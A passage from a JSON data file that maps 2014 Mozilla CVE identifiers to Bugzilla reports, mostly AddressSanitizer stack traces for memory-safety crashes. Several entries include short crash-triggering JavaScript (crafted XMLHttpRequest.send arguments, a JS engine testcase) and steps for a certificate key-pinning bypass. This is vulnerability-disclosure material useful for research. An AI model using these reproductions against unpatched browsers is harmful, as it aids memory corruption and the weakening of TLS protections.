nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, gfxContext*, nsIFrame*, nsLineList_iterator const*, unsigned int*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:2559 #9 0x7fdb4747a49e in nsTextFrame::AddInlineMinWidthForFlow(nsRenderingContext*, nsIFrame::InlineMinWidthData*, nsTextFrame::TextRunType) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:7018 #10 0x7fdb4747b87f in nsTextFrame::AddInlineMinWidth(nsRenderingContext*, nsIFrame::InlineMinWidthData*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:7175 #11 0x7fdb4731cb1d in nsBlockFrame::GetMinWidth(nsRenderingContext*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsBlockFrame.cpp:733 #12 0x7fdb472ab05a in nsLayoutUtils::IntrinsicForContainer(nsRenderingContext*, nsIFrame*, nsLayoutUtils::IntrinsicWidthType, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsLayoutUtils.cpp:3732 #13 0x7fdb4731c958 in nsBlockFrame::GetMinWidth(nsRenderingContext*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsBlockFrame.cpp:713 #14 0x7fdb472ab05a in nsLayoutUtils::IntrinsicForContainer(nsRenderingContext*, nsIFrame*, nsLayoutUtils::IntrinsicWidthType, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsLayoutUtils.cpp:3732 #15 0x7fdb4731c958 in nsBlockFrame::GetMinWidth(nsRenderingContext*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsBlockFrame.cpp:713 #16 0x7fdb472ab05a in nsLayoutUtils::IntrinsicForContainer(nsRenderingContext*, nsIFrame*, nsLayoutUtils::IntrinsicWidthType, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsLayoutUtils.cpp:3732 #17 0x7fdb4731c958 in nsBlockFrame::GetMinWidth(nsRenderingContext*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsBlockFrame.cpp:713 #18 0x7fdb472ab05a in nsLayoutUtils::IntrinsicForContainer(nsRenderingContext*, nsIFrame*, nsLayoutUtils::IntrinsicWidthType, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsLayoutUtils.cpp:3732 #19 0x7fdb4731c958 in nsBlockFrame::GetMinWidth(nsRenderingContext*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsBlockFrame.cpp:713 #20 0x7fdb472ab05a in nsLayoutUtils::IntrinsicForContainer(nsRenderingContext*, nsIFrame*, nsLayoutUtils::IntrinsicWidthType, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsLayoutUtils.cpp:3732 #21 0x7fdb4731c958 in nsBlockFrame::GetMinWidth(nsRenderingContext*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsBlockFrame.cpp:713 #22 0x7fdb472ab05a in nsLayoutUtils::IntrinsicForContainer(nsRenderingContext*, nsIFrame*, nsLayoutUtils::IntrinsicWidthType, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsLayoutUtils.cpp:3732 #23 0x7fdb4731c958 in nsBlockFrame::GetMinWidth(nsRenderingContext*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsBlockFrame.cpp:713 #24 0x7fdb472ab05a in nsLayoutUtils::IntrinsicForContainer(nsRenderingContext*, nsIFrame*, nsLayoutUtils::IntrinsicWidthType, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/base/nsLayoutUtils.cpp:3732 #25 0x7fdb4731c958 in nsBlockFrame::GetMinWidth(nsRenderingContext*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsBlockFrame.cpp:713 #26 0x7fdb4739806e in nsFrame::ShrinkWidthToFit(nsRenderingContext*, int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsFrame.cpp:4240 #27 0x7fdb47364d14 in nsContainerFrame::ComputeAutoSize(nsRenderingContext*, nsSize, int, nsSize, nsSize, nsSize, bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsContainerFrame.cpp:899 #28 0x7fdb47396adc in nsFrame::ComputeSize(nsRenderingContext*, nsSize, int, nsSize, nsSize, nsSize, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsFrame.cpp:4030 #29 0x7fdb473f7c1d in nsHTMLReflowState::InitAbsoluteConstraints(nsPresContext*, nsHTMLReflowState const*, int, int, nsIAtom*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsHTMLReflowState.cpp:1458 SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ?? Shadow bytes around the buggy address: 0x0c18800522f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c1880052300: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c1880052310: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 0x0c1880052320: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c1880052330: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 =>0x0c1880052340: 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa 0x0c1880052350: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c1880052360: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c1880052370: 00 00 00 00 00 00 00 04 fa fa fa fa fa fa fa fa 0x0c1880052380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c1880052390: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Contiguous container OOB:fc ASan internal: fe ==7111==ABORTING"
      }
    ],
    "CVE-2014-1578": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1063327",
        "title": "OOB write in get_tile",
        "description": "================================================================= ==24164==ERROR: AddressSanitizer: SEGV on unknown address 0x62efc607675c (pc 0x7fd5dda2a9a8 bp 0x7fd5b61c89a0 sp 0x7fd5b61c7500 T32) #0 0x7fd5dda2a9a7 in vp9_decode_frame media/libvpx/vp9/decoder/vp9_decodframe.c:51:3 #1 0x7fd5dda36d0d in vp9_receive_compressed_data media/libvpx/vp9/decoder/vp9_onyxd_if.c:348:13 #2 0x7fd5ddb04aa8 in vp9_decode media/libvpx/vp9/vp9_dx_iface.c:349:9 #3 0x7fd5ddb06586 in vpx_codec_decode media/libvpx/vpx/src/vpx_decoder.c:127:11 #4 0x7fd5daac6fb6 in mozilla::WebMReader::DecodeVideoFrame(bool&, long) content/media/webm/WebMReader.cpp:916:9 #5 0x7fd5da7e0074 in mozilla::MediaDecoderReader::RequestVideoData(bool, long) content/media/MediaDecoderReader.cpp:167:10 #6 0x7fd5da896b98 in nsRunnableMethodImpl<void (mozilla::MediaDecoderStateMachine::*)(), void, true>::Run() objdir-ff-asan/content/media/../../dist/include/nsThreadUtils.h:388:7 #7 0x7fd5da871b12 in mozilla::MediaTaskQueue::Runner::Run() content/media/MediaTaskQueue.cpp:194:3 #8 0x7fd5d500747a in nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:220:7 #9 0x7fd5d5007a3c in non-virtual thunk to nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:234:1 #10 0x7fd5d4ffdc0a in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:823:7 #11 0x7fd5d5071e92 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:265:10 #12 0x7fd5d5ca75d7 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:326:20 #13 0x7fd5d5c348b0 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:229:3 #14 0x7fd5d4ff7b9b in nsThread::ThreadFunc(void*) xpcom/threads/nsThread.cpp:350:5 #15 0x7fd5e62ac780 in _pt_root nsprpub/pr/src/pthreads/ptthread.c:212:5 #16 0x7fd5ea9dbf6d in start_thread /build/buildd/eglibc-2.17/nptl/pthread_create.c:311 AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV ??:0 ?? Thread T32 (Media Decode #2) created by T31 (Media Decode #1) here: #0 0x43a1be in __interceptor_pthread_create _asan_rtl_ #1 0x7fd5e62a949f in _PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:453:14 #2 0x7fd5e62a901a in PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:544:12 #3 0x7fd5d4ff9d3d in nsThread::Init() xpcom/threads/nsThread.cpp:455:19 #4 0x7fd5d50039c3 in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) xpcom/threads/nsThreadManager.cpp:269:17 #5 0x7fd5d5005a06 in nsThreadPool::PutEvent(nsIRunnable*) xpcom/threads/nsThreadPool.cpp:101:3 #6 0x7fd5d5007ff0 in nsThreadPool::Dispatch(nsIRunnable*, unsigned int) xpcom/threads/nsThreadPool.cpp:261:5 #7 0x7fd5da872129 in mozilla::MediaTaskQueue::Runner::Run() content/media/MediaTaskQueue.cpp:225:19 #8 0x7fd5d500747a in nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:220:7 #9 0x7fd5d5007a3c in non-virtual thunk to nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:234:1 #10 0x7fd5d4ffdc0a in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:823:7 #11 0x7fd5d5071e92 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:265:10 #12 0x7fd5d5ca75d7 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:326:20 #13 0x7fd5d5c348b0 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:229:3 #14 0x7fd5d4ff7b9b in nsThread::ThreadFunc(void*) xpcom/threads/nsThread.cpp:350:5 #15 0x7fd5e62ac780 in _pt_root nsprpub/pr/src/pthreads/ptthread.c:212:5 #16 0x7fd5ea9dbf6d in start_thread /build/buildd/eglibc-2.17/nptl/pthread_create.c:311 Thread T31 (Media Decode #1) created by T30 (Media S~hine #1) here: #0 0x43a1be in __interceptor_pthread_create _asan_rtl_ #1 0x7fd5e62a949f in _PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:453:14 #2 0x7fd5e62a901a in PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:544:12 #3 0x7fd5d4ff9d3d in nsThread::Init() xpcom/threads/nsThread.cpp:455:19 #4 0x7fd5d50039c3 in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) xpcom/threads/nsThreadManager.cpp:269:17 #5 0x7fd5d5005a06 in nsThreadPool::PutEvent(nsIRunnable*) xpcom/threads/nsThreadPool.cpp:101:3 #6 0x7fd5d5007ff0 in nsThreadPool::Dispatch(nsIRunnable*, unsigned int) xpcom/threads/nsThreadPool.cpp:261:5 #7 0x7fd5da8704ab in mozilla::MediaTaskQueue::DispatchLocked(mozilla::TemporaryRef<nsIRunnable>, mozilla::MediaTaskQueue::DispatchMode) content/media/MediaTaskQueue.cpp:53:17 #8 0x7fd5da7e1045 in mozilla::MediaTaskQueue::Dispatch(mozilla::TemporaryRef<nsIRunnable>) content/media/MediaTaskQueue.cpp:34:10 #9 0x7fd5da808273 in mozilla::MediaDecoderStateMachine::EnqueueDecodeMetadataTask() content/media/MediaDecoderStateMachine.cpp:1569:17 #10 0x7fd5da80f494 in mozilla::MediaDecoderStateMachine::RunStateMachine() content/media/MediaDecoderStateMachine.cpp:2356:14 #11 0x7fd5da819d5a in mozilla::MediaDecoderStateMachineScheduler::TimeoutExpired(int) content/media/MediaDecoderStateMachineScheduler.cpp:160:10 #12 0x7fd5d500747a in nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:220:7 #13 0x7fd5d5007a3c in non-virtual thunk to nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:234:1 #14 0x7fd5d4ffdc0a in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:823:7 #15 0x7fd5d5071e92 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:265:10 #16 0x7fd5d5ca75d7 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:326:20 #17 0x7fd5d5c348b0 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:229:3 #18 0x7fd5d4ff7b9b in nsThread::ThreadFunc(void*) xpcom/threads/nsThread.cpp:350:5 #19 0x7fd5e62ac780 in _pt_root nsprpub/pr/src/pthreads/ptthread.c:212:5 #20 0x7fd5ea9dbf6d in start_thread /build/buildd/eglibc-2.17/nptl/pthread_create.c:311 Thread T30 (Media S~hine #1) created by T0 here: #0 0x43a1be in __interceptor_pthread_create _asan_rtl_ #1 0x7fd5e62a949f in _PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:453:14 #2 0x7fd5e62a901a in PR_CreateThread nsprpub/pr/src/pthreads/ptthread.c:544:12 #3 0x7fd5d4ff9d3d in nsThread::Init() xpcom/threads/nsThread.cpp:455:19 #4 0x7fd5d50039c3 in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) xpcom/threads/nsThreadManager.cpp:269:17 #5 0x7fd5d5005a06 in nsThreadPool::PutEvent(nsIRunnable*) xpcom/threads/nsThreadPool.cpp:101:3 #6 0x7fd5d5007ff0 in nsThreadPool::Dispatch(nsIRunnable*, unsigned int) xpcom/threads/nsThreadPool.cpp:261:5 #7 0x7fd5da818f22 in mozilla::MediaDecoderStateMachineScheduler::Schedule(long) content/media/MediaDecoderStateMachineScheduler.cpp:129:10 #8 0x7fd5da7bc84b in mozilla::MediaDecoder::ScheduleStateMachineThread() content/media/MediaDecoderStateMachine.cpp:3001:10 #9 0x7fd5da7c068a in mozilla::MediaDecoder::InitializeStateMachine(mozilla::MediaDecoder*) content/media/MediaDecoder.cpp:572:10 #10 0x7fd5da53c88a in mozilla::dom::HTMLMediaElement::FinishDecoderSetup(mozilla::MediaDecoder*, mozilla::MediaResource*, nsIStreamListener**, mozilla::MediaDecoder*) content/html/content/src/HTMLMediaElement.cpp:2674:17 #11 0x7fd5da51e39f in mozilla::dom::HTMLMediaElement::InitializeDecoderForChannel(nsIChannel*, nsIStreamListener**) content/html/content/src/HTMLMediaElement.cpp:2624:12 #12 0x7fd5da51ce0a in mozilla::dom::HTMLMediaElement::MediaLoadListener::OnStartRequest(nsIRequest*, nsISupports*) content/html/content/src/HTMLMediaElement.cpp:350:7 #13 0x7fd5d52167a4 in nsBaseChannel::OnStartRequest(nsIRequest*, nsISupports*) netwerk/base/src/nsBaseChannel.cpp:737:14 #14 0x7fd5d52691c6 in nsInputStreamPump::OnStateStart() netwerk/base/src/nsInputStreamPump.cpp:531:14 #15 0x7fd5d52679d4 in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) netwerk/base/src/nsInputStreamPump.cpp:433:25 #16 0x7fd5d4fb078f in nsInputStreamReadyEvent::Run() xpcom/io/nsStreamUtils.cpp:88:9 #17 0x7fd5d4ffdc0a in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:823:7 #18 0x7fd5d5071e92 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:265:10 #19 0x7fd5d5ca50a4 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:99:21 #20 0x7fd5d5c348b0 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:229:3 #21 0x7fd5d9ced0f2 in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:164:3 #22 0x7fd5dd40d242 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:280:19 #23 0x7fd5dd543979 in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:4101:10 #24 0x7fd5dd544a92 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:4172:8 #25 0x7fd5dd545a2c in XRE_main toolkit/xre/nsAppRunner.cpp:4386:16 #26 0x4bdedd in main browser/app/nsBrowserApp.cpp:282:12 #27 0x7fd5e9a03de4 in __libc_start_main /build/buildd/eglibc-2.17/csu/libc-start.c:260"
      }
    ],
    "CVE-2014-1580": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1063733",
        "title": "Apparent use of uninitialized memory when rendering truncated GIFs to <canvas>",
        "description": "Hey, This seems reminiscent of bug 1045977, but affects 32.0: http://lcamtuf.coredump.cx/ffgif2/ The page creates multiple Image() instances of a truncated GIF (./id:000158,orig:000158,src:000140.gif) repeatedly and then renders them on <canvas>. In my testing, this results in the missing (transparent) region being rendered in 2-8 distinct ways, suggesting the use of uninitialized memory (and the risk of leaking secrets across domains). /mz"
      }
    ],
    "CVE-2014-1582": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1049095",
        "title": "Spdy/Http-2 Coalescing Key Pinning Bypass",
        "description": "I was informed of a potential key pinning bypass attack that I can confirm we are vulnerable to. The attack uses spdy/h2 connection-coalescing to bypass the key pin. Assume a.example.com is pinned to key-a and b.example.com is pinned to key-b 1] goto host https://a.example.com/ - it has a cert valid for *.example.com on 1.1.1.1 and uses key-a.. it negotiates a spdy connection that stays alive. 2] ask for https://b.example.com/ - it resolves also to 1.1.1.1. Under the spdy/h2 coalescing rules b can use the spdy connection from step 1 because it is the same host (1.1.1.1) and that connection has a valid cert for b.example.com (it was a wildcard) so it can be \"joined\" the problem is that b.example.com/ is dispatched on the connection that used key-a and b is supposed to be pinned to key-b. Before the \"joining\" we can just check if the connection from step 1 has a full cert chain that satisfies any pins for b.example.com - unfortunately getting the full cert chain requires some work especially with resumed connections (bug 731478) Realistically, this is probably not a big problem because the configuration is somewhat non-sensical. If these hosts are really eligible for coalescing (which is being done now on <=ff31 which doesn't have any key pinning checks) then you would expect they would be pinned to the same key. The inclination between keeler, monica, and myself was to try and get this in 34 and ride the trains with the fix."
      }
    ],
    "CVE-2014-1584": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1066190",
        "title": "if an unknown issuer error is encountered before pinning checks are done, pinning checks never happen",
        "description": "If a certificate's issuer can't be found, IsChainValid never gets called, which is where we do our pinning checks. As a result, a user can be presented with an overridable error on a site that should be pinned (i.e. we should display a pinning error and not allow an override). STR: 1. run an https server with a self-signed cert 2. use /etc/hosts to redirect pinningtest.appspot.com to localhost 3. set pinning enforcement to \"strict\" (2) 4. visit https://pinningtest.appspot.com expected results: pinning error page, not overridable actual results: unknown issuer page, overridable"
      }
    ],
    "CVE-2014-1587": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1079729",
        "title": "PeerConnection.createDataChannel crashes remote end in mozilla::detail::PrimitiveIntrinsics<int>::sub(long*, long)",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0 Build ID: 20140924083558 Steps to reproduce: 1. Load the attached page webrtc-dc-testcourt.html in two Firefox instances 2. In instance A click \"Create Offer\" 3. Copy the resulting offer from the lower textarea of instance A into the upper textarea of instance B and on instance B click \"Accept offer\" 4. Copy the resulting answer from the lower textarea of instance B into the upper textarea of instance A and on instance A click \"Accept answer\" 5. On instance A you should see \"open event: dc onopen\" and no instance B you should see \"info event: pc ondatachannel\" 6. On instance A click \"Create additional DC\" 7. Instance B should log \"info event: pc ondatachannel\" Actual results: When repeating step 6 multiple times (seems to differ between 8 and 10), instance B crashes. Expected results: AFAIK it should be possible to open at least 16 Data Channels per PeerConnection (netwerk/sctp/datachannel/DataChannelProtocol.h:#define WEBRTC_DATACHANNEL_STREAMS_DEFAULT 16) What should actually never happen is that one end crashes completely."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1042567",
        "title": "Crash [@ js::FetchName] or Assertion failure: shape->hasSlot(), at vm/Interpreter-inl.h",
        "description": "x = (function() {}) __proto__ = x Object.freeze(wrap(x)) arguments asserts js debug shell on m-c changeset 82df3654cd80 with --no-baseline --ion-offthread-compile=off --ion-eager at Assertion failure: shape->hasSlot(), at vm/Interpreter-inl.h and crashes js opt shell at js::FetchName My configure flags are: (opt) CC=\"clang -Qunused-arguments\" CXX=\"clang++ -Qunused-arguments\" AR=ar sh /Users/skywalker/trees/mozilla-central/js/src/configure --target=x86_64-apple-darwin12.5.0 --disable-debug --enable-optimize --enable-gczeal --enable-debug-symbols --disable-tests --enable-more-deterministic --with-ccache --enable-threadsafe Debug: CC=\"clang -Qunused-arguments\" CXX=\"clang++ -Qunused-arguments\" AR=ar sh /Users/skywalker/trees/mozilla-central/js/src/configure --target=x86_64-apple-darwin12.5.0 --enable-debug --enable-optimize --enable-gczeal --enable-debug-symbols --disable-tests --enable-more-deterministic --with-ccache --enable-threadsafe autoBisect shows this is probably related to the following changeset: The first bad revision is: changeset: https://hg.mozilla.org/mozilla-central/rev/e0741f7815ff user: Jason Orendorff date: Fri Apr 25 16:11:01 2014 -0500 summary: Bug 547140, part 2 - Remove flags argument from JS_GetPropertyDescriptor and friends. r=Waldo. Setting s-s and sec-critical as a start because this seems to access a weird memory address 0x109722000 in the opt shell. Jason, is bug 547140 likely related?"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1089207",
        "title": "sipcc SDP parser can corrupt memory",
        "description": "While fuzzing SDParta I found this little gem in our SDP parsing code: http://dxr.mozilla.org/mozilla-central/source/media/webrtc/signaling/src/sipcc/core/sdp/sdp_attr.c#508 I think if you hand Firefox some SDP with a missing newline the above loop will walk through all your memory and replace '/' with ';' where ever it finds '/'s in you memory until it finally comes across a newline some where in you memory."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1072847",
        "title": "Crash [@ _moz_cairo_surface_destroy] with long DOM Notification, only on Windows",
        "description": "No description provided."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1080312",
        "title": "Crash in DataChannels/sctp timer loop when far-end is being debugged with GDB",
        "description": "When debugging DataChannels, if one side is stalled (in gdb) for a long time, the other side may crash in a sctp-timer-processing routing accessing freed memory. Crashes in user_sctp_timer_iterate.c:81: if (c->c_time <= ticks) with c = 0xa5a5a5a5a5a5a5a5 Suspicion is that in processing one timer (and it drops to lock to process the timer) it freed another item on the list. Michael Tuexen thinks he knows the actual cause. Several people have seen this (and I'm fairly sure I've hit it before but never got a useful stack from it). sec-crit because it uses the freed-memory-pointer to load a function pointer and call it. Likely affects multiple releases as we haven't changed the SCTP library recently."
      }
    ],
    "CVE-2014-1590": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1087633",
        "title": "XMLHttpRequest.prototype.send crashes when given a crafted object",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36 Steps to reproduce: Crashes safely on an out-of-thread access: xhr = new XMLHttpRequest(); xhr.open('POST', '/'); xhr.send({available: function(){}}); Crashes safely on null ptr deref: q=0; u = new Proxy({}, {get:function(){ if(q++>0){xhr.abort()} return function(){}; }}); xhr = new XMLHttpRequest(); xhr.open('POST', '/k'); xhr.send(u); I didn't explore any further. Looks like a type confusion issue. I poked around a bit to look for exploitability, but nothing obvious jumped out at me. Expected results: Sorry for the terrible huge crash screenshot! I forgot to dump the stack to text."
      }
    ],
    "CVE-2014-1593": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1085175",
        "title": "Stack-buffer-overflow Write in mozilla::FileBlockCache::Read",
        "description": "==35313==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f042e1930d1 at pc 0x000000454893 bp 0x7f042e192af0 sp 0x7f042e1922b0 WRITE of size 8200 at 0x7f042e1930d1 thread T83 (Media Decode #1) #0 0x454892 in __interceptor_read.part.40 /build/llvm/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:352 #1 0x7f0467295fc7 in pt_Read /build/firefox/src/nsprpub/pr/src/pthreads/ptio.c:1287:13 #2 0x7f0459e1962f in (anonymous namespace)::interposedRead(PRFileDesc*, void*, int) /build/firefox/src/xpcom/build/NSPRInterposer.cpp:58:10 #3 0x7f045e2b92ec in mozilla::FileBlockCache::Read(long, unsigned char*, int, int*) /build/firefox/src/content/media/FileBlockCache.cpp:146:16 #4 0x7f045e2d380c in mozilla::MediaCacheStream::Read(char*, unsigned int, unsigned int*) /build/firefox/src/content/media/MediaCache.cpp:672:10 #5 0x7f045e32395d in mozilla::ChannelMediaResource::Read(char*, unsigned int, unsigned int*) #6 0x7f045e4e8875 in mozilla::webm_read(void*, unsigned long, void*) #7 0x7f046047b1f6 in ne_peek_element /build/firefox/src/media/libnestegg/src/nestegg.c:551:10 #8 0x5d8997ddbd0d9e6f (<unknown module>) Address 0x7f042e1930d1 is located in stack of thread T83 (Media Decode #1) at offset 49 in frame #0 0x7f046047b05f in ne_peek_element /build/firefox/src/media/libnestegg/src/nestegg.c:892 This frame has 2 object(s): [32, 33) 'b.i.i1' [48, 49) 'b.i.i' <== Memory access at offset 49 overflows this variable HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext (longjmp and C++ exceptions *are* supported) Thread T83 (Media Decode #1) created by T82 (Media S~hine #1) here: #0 0x439cbe in __interceptor_pthread_create _asan_rtl_ #1 0x7f0467297030 in _PR_CreateThread /build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:453:14 #2 0x7f0467296c5a in PR_CreateThread /build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:544:12 #3 0x7f0459de2805 in nsThread::Init() /build/firefox/src/xpcom/threads/nsThread.cpp:455:19 #4 0x7f0459de7d94 in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) /build/firefox/src/xpcom/threads/nsThreadManager.cpp:269:17 #5 0x7f0459de91e0 in nsThreadPool::PutEvent(nsIRunnable*) /build/firefox/src/xpcom/threads/nsThreadPool.cpp:101:3 #6 0x7f0459deaa0c in nsThreadPool::Dispatch(nsIRunnable*, unsigned int) /build/firefox/src/xpcom/threads/nsThreadPool.cpp:261:5 #7 0x7f045e3469a4 in mozilla::MediaTaskQueue::DispatchLocked(mozilla::TemporaryRef<nsIRunnable>, mozilla::MediaTaskQueue::DispatchMode) /build/firefox/src/content/media/MediaTaskQueue.cpp:53:17 #8 0x7f045e30bc08 in mozilla::MediaDecoderStateMachine::EnqueueDecodeMetadataTask() /build/firefox/src/content/media/MediaTaskQueue.cpp:34:10 #9 0x7f045e31045a in mozilla::MediaDecoderStateMachine::RunStateMachine() /build/firefox/src/content/media/MediaDecoderStateMachine.cpp:2376:14 #10 0x7f045e364136 in non-virtual thunk to (anonymous namespace)::TimerEvent::Run() /build/firefox/src/content/media/MediaDecoderStateMachineScheduler.cpp:160:10 #11 0x7f0459dea070 in nsThreadPool::Run() /build/firefox/src/xpcom/threads/nsThreadPool.cpp:220:7 #12 0x7f0459dea5bc in non-virtual thunk to nsThreadPool::Run() #13 0x7f0459de46f6 in nsThread::ProcessNextEvent(bool, bool*) /build/firefox/src/xpcom/threads/nsThread.cpp:830:7 #14 0x7f0459e3aa66 in NS_ProcessNextEvent(nsIThread*, bool) /build/firefox/src/xpcom/glue/nsThreadUtils.cpp:265:10 #15 0x7f045a66d29e in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /build/firefox/src/ipc/glue/MessagePump.cpp:368:5 #16 0x7f045a61c561 in MessageLoop::Run() /build/firefox/src/ipc/chromium/src/base/message_loop.cc:233:3 #17 0x7f0459de14a6 in nsThread::ThreadFunc(void*) /build/firefox/src/xpcom/threads/nsThread.cpp:350:5 #18 0x7f046729a4d0 in _pt_root /build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:212:5 #19 0x7f046aa1fe99 in start_thread /build/buildd/eglibc-2.15/nptl/pthread_create.c:308 Thread T82 (Media S~hine #1) created by T0 here: #0 0x439cbe in __interceptor_pthread_create _asan_rtl_ #1 0x7f0467297030 in _PR_CreateThread /build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:453:14 #2 0x7f0467296c5a in PR_CreateThread /build/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:544:12 #3 0x7f0459de2805 in nsThread::Init() /build/firefox/src/xpcom/threads/nsThread.cpp:455:19 #4 0x7f0459de7d94 in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) /build/firefox/src/xpcom/threads/nsThreadManager.cpp:269:17 #5 0x7f0459de91e0 in nsThreadPool::PutEvent(nsIRunnable*) /build/firefox/src/xpcom/threads/nsThreadPool.cpp:101:3 #6 0x7f0459deaa0c in nsThreadPool::Dispatch(nsIRunnable*, unsigned int) /build/firefox/src/xpcom/threads/nsThreadPool.cpp:261:5 #7 0x7f045e315989 in mozilla::MediaDecoderStateMachineScheduler::Schedule(long) /build/firefox/src/content/media/MediaDecoderStateMachineScheduler.cpp:129:10 #8 